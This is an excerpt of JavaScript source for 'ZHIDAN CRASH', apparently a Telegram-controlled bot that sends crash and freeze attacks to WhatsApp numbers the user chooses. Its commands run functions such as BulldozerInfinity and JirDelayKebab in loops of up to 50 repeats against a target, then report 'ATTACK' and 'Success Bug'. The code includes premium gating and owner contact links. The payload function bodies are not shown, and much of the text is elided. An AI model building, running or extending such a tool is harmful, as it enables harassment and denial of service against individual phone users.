...
let REQUIRED_CHANNEL_USERNAME = "@zhidanalone";
...
// ================= CONFIG =================
const IMAGES = {
  home: "https://files.catbox.moe/2q1h6x.jpg"
};
...
𑁍┊ZHIDAN CRASH         
━━━━━━━━━━━━━━⪼
┏━⪼ INFORMATION ZHIDAN CRASH
┊々 Developer  : @zhidankebab
┊々 System     : free
┊々 Version    : 2.0 gen 3
...
┃➤ 𝙹𝙰𝚂 [ 𝙱𝙴𝚂𝚃𝙵𝚁𝙸𝙴𝙽𝙳 ]
┃➤ 𝚂𝙴𝙸𝙺𝚈𝙾𝚄 [ 𝙱𝙴𝚂𝚃𝙵𝚁𝙸𝙴𝙽𝙳 ]
┃➤ 𝚈𝙰𝙽𝚉𝙽𝙾𝚃𝙳𝙴𝚅 [ 𝙱𝙴𝚂𝚃𝙵𝚁𝙸𝙴𝙽𝙳 ]
┃➤ 𝙻𝙰𝙽𝙶𝙶𝙴𝙽𝙶 [ 𝙱𝙴𝚂𝚃𝙵𝚁𝙸𝙴𝙽𝙳 ]
┃➤ 𝚁𝙰𝙼𝚉𝚉 [ 𝙱𝙴𝚂𝚃𝙵𝚁𝙸𝙴𝙽𝙳 ]
└────────────────────

┌─〔 SPECIAL THANKS 〕
│ ✦ Semua Member ZHIDAN CRASH
│ ✦ All Hatters & Pembenci
└────────────────────

╰━━━〔 ZHIDAN CRASH NEVER DIE 〕━━━╯
...
━━━━━━━━━━━━━━━━━━
ZHIDAN CRASHL DETECTED SYSTEM ACTIVE`,
      { parse_mode: "HTML" }
    );
...
`
\`\`\`js
𝗭𝗛𝗜𝗗𝗔𝗡 𝗖𝗥𝗔𝗦𝗛 - 𝙇𝙄𝙎𝙏 𝘼𝘿𝙈𝙄𝙉 𝘼𝘾𝘾𝙀𝙎𝙎 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙖𝙙𝙢𝙞𝙣
\`\`\`
`,
  ...
  try {
    ...
    for (let step of steps) {
      ...
      await ctx.telegram.editMessageText(
        ...
        msg.message_id,
        null,
        `🤖 <b>ZHIDAN CRASHL SYSTEM CHECK</b>\n\n${step}`,
        { parse_mode: "HTML" }
      );
    }
...
bot.command("iqc", async (ctx) => {
  ...
  try {
    ...
    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By ZHIDAN CRASHL Kece ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
...
╚══════════════════════════╝
        ...
        await ctx.reply(teks, {
            ...
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "👑 Contact Owner", url: "https://t.me/zhidankebab", style: "danger" }
                    ]
                ]
            }
        });
...
bot.command("connect", checkOwner, async (ctx) => {
  ...
  "https://files.catbox.moe/2q1h6x.jpg",//ganti jadi url catbox gambar lu
      {
        caption:
`
\`\`\`js
𝗭𝗛𝗜𝗗𝗔𝗡 𝗖𝗥𝗔𝗦𝗛 - 𝙋𝘼𝙄𝙍𝙄𝙉𝙂
━━━━━━━━━━
...
bot.command("Yokskurt", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    ...
    await ctx.replyWithPhoto(
      "https://files.catbox.moe/2q1h6x.jpg", // ✅ FIX DISINI
      {
        caption: `
...
{ text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/zhidankebab`, style: "success", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
            ]
          ]
        }
      }
...
{ text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/zhidankebab`, style: "danger", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
            ]
          ]
        }
      }
    ...
    (async () => {
      for (let r = 0; r < 6; r++) {
        try {
        await BulldozerInfinity(sock, target);
        await DelayBulldozer(sock, target);
        await gmDelayInvisCrush(sock, target);
        await sleep(5000);
        } catch (err) {
          console.log("⚠️ TERJADI ERROR PADA SAAT MENJALANKAN COMMAND:", err);
        }
...
╘═——————————————═⬡</pre></blockquote>`,
        ...
        reply_markup: {
          inline_keyboard: [
            [
              { text: "༊ 𝐂𝐇𝐄𝐊𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ༗", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6034957065569441680" },    
{ text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/zhidankebab`, style: "primary", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
            ]
          ]
        }
      }
...
{ text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/zhidankebab`, style: "danger", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
    ...
    (async () => {
      for (let r = 0; r < 50; r++) {
        try {
        await JirDelayKebab(sock, target);
          await sleep(1000);
        } catch (err) {
          console.log("⚠️ TERJADI ERROR PADA SAAT MENJALANKAN COMMAND:", err);
        }
...
bot.command("freeze", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    ...
    // 🚀 PROCESSING
    await ctx.replyWithPhoto(
      { url: "https://files.catbox.moe/2q1h6x.jpg" },
      {
...
bot.command("testfunction", async (msg, match) => {
  ...
  try {
    ...
    const processMsg = await bot.sendPhoto(chatId, thumbnailUrlV2, {
      caption: `
<blockquote><pre>⬡═―—⊱ ⎧ ZHIDAN CRASHL ATTACK ⎭ ⊰―—═⬡
▢  Target: ${q}
▢  Type: Unknown Func
▢  Status: Process Bug
╘═——————————————═⬡</pre></blockquote>`,
    ...
    const finalText = `
<blockquote><pre>⬡═―—⊱ ⎧ ZHIDAN CRASHL ATTACK ⎭ ⊰―—═⬡</pre></blockquote>
▢  Target: ${q}
▢  Type: Unknown Func
▢  Status: Success Bug
╘═——————————————═⬡`;
